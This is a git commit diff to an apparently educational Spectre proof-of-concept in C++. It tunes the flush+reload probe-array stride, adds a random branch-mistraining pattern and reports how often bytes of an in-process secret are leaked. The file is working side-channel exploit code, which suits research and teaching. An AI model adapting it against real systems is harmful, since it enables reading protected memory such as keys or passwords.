cb5792f2fbfc03bfa22503bc95b41d0335412264
Kingfish404 <jinyu929@qq.com>
2022-11-10 01:05:09 +0800

    feat: random mistrain and optimised printf

--- spectre/main.cpp
+++ spectre/main.cpp
@@ -12,7 +12,7 @@ const int TRAINING_LOOPS = 100;
 const int INBETWEEN_DELAY = 10;
 bool IS_ATTACK[TRAINING_LOOPS];
 
-char __attribute__((aligned(4096))) mem_side_channel[256 * 4096];
+char __attribute__((aligned(2048))) mem_side_channel[256 * 2048];
 uint8_t arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};
 uint8_t hist[256];
 
@@ -25,7 +25,7 @@ void side_channel_check()
 {
     for (size_t i = FROM; i <= TO; i++)
     {
-        if (ASMUtils::flush_reload((char *)mem_side_channel + 4096 * i))
+        if (ASMUtils::flush_reload((char *)mem_side_channel + 2048 * i))
         {
             hist[i]++;
         }
@@ -42,15 +42,19 @@ bool is_prime(int a)
     return true;
 }
 
+// #define LOOP
+// #define PRIME
 void init_attack_setting()
 {
-    // for (int i = 0; i < TRAINING_LOOPS; i++)
-    // {
-    //     if (i % 8 == 0)
-    //     {
-    //         IS_ATTACK[i] = true;
-    //     }
-    // }
+#ifdef LOOP
+    for (int i = 0; i < TRAINING_LOOPS; i++)
+    {
+        if (i % 8 == 0)
+        {
+            IS_ATTACK[i] = true;
+        }
+    }
+#elif defined(PRIME)
     for (int i = 0; i < TRAINING_LOOPS; i++)
     {
         if (is_prime(i))
@@ -58,6 +62,16 @@ void init_attack_setting()
             IS_ATTACK[i] = true;
         }
     }
+#else
+    for (int i = 0; i < TRAINING_LOOPS; i++)
+    {
+        if ((double)rand() / RAND_MAX > 0.5)
+        {
+            IS_ATTACK[i] = true;
+        }
+    }
+#endif
+
     printf("Mistrain(0) and Attack(1) Mark: \n");
     for (int i = 0; i < TRAINING_LOOPS; i++)
     {
@@ -68,10 +82,10 @@ void init_attack_setting()
 
 uint8_t spectre(size_t locate)
 {
-    // return mem_side_channel[arr[locate] * 4096];
+    // return mem_side_channel[arr[locate] * 2048];
     if (locate < arr_size)
     {
-        return mem_side_channel[arr[locate] * 4096];
+        return mem_side_channel[arr[locate] * 2048];
     }
     return 0;
 }
@@ -82,7 +96,7 @@ void attack(size_t target)
     int i, j;
     for (size_t i = 0; i < 256; i++)
     {
-        ASMUtils::flush(&mem_side_channel[i * 4096]);
+        ASMUtils::flush(&mem_side_channel[i * 2048]);
     }
     for (i = TRAINING_LOOPS - 1; i >= 0; i--)
     {
@@ -96,11 +110,11 @@ void attack(size_t target)
             idx = IS_ATTACK[j] * target + (!IS_ATTACK[j]) * train_idx;
             // printf("idx %ld\n", idx);
             uint8_t result = spectre(idx);
-            // printf("result: %d\n", result);
+            // printf("result: %c\n", result);
         }
 
         // fake spectre
-        // char tc = mem_side_channel[arr[target] * 4096];
+        // char tc = mem_side_channel[arr[target] * 2048];
         // printf("%c\n", arr[target]);
 
         side_channel_check();
@@ -135,11 +149,11 @@ size_t show_side_channel()
 size_t run(size_t locate)
 {
     memset(hist, 0, sizeof(hist));
-    for (size_t i = 0; i < sizeof(mem_side_channel) / 4096; i++)
+    for (size_t i = 0; i < sizeof(mem_side_channel) / 2048; i++)
     {
-        for (size_t j = 0; j < 4096; j++)
+        for (size_t j = 0; j < 2048; j++)
         {
-            mem_side_channel[i * 4096 + j] = i;
+            mem_side_channel[i * 2048 + j] = i;
         }
     }
     size_t times = 10;
@@ -166,18 +180,19 @@ int main(int argc, char **argv)
     // printf("%ld\n", sizeof(uint8_t));
     // printf("%ld\n", sizeof(char));
     // printf("%c\n", arr[target_base]);
-    size_t leak[arr_size + 1], len = sizeof(secret) / sizeof(char);
+    size_t leak[arr_size + 1], len = sizeof(secret) / sizeof(char), success = 0;
     for (size_t i = 0; i < len - 1; i++)
     {
         size_t result = run(target_base + i);
         leak[i] = result;
         printf("gt: %c, success: %s \n",
                secret[i], secret[i] == (char)result ? "ture" : "false");
+        success += secret[i] == (char)result;
     }
     for (size_t i = 0; i < len - 1; i++)
     {
         printf("%c", leak[i]);
     }
-    printf("\n");
+    printf(", success rate: %.3lf%%\n", (double)success / (len - 1) * 100);
     return 0;
 }
